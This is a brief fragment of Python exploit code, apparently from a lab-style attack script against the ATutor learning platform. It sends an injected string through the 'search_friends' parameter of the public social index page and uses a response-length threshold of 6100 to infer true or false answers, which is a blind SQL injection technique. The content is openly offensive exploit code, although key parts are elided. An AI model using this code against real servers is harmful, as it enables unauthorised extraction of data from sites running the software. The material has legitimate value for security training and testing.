...
def searchFriends_sqli(ip, inj_str):
    target = "http://{}/ATutor/mods/_standard/social/index_public.php?search_friends={}".format(ip, inj_str)
...
def searchFriends_sqli2(ip, inj_str, query_type):
    ...
    if query_type == True and content_length >= 6100:
        return True
    elif query_type == False and content_length <= 6100:
        return True
    else:
        return False
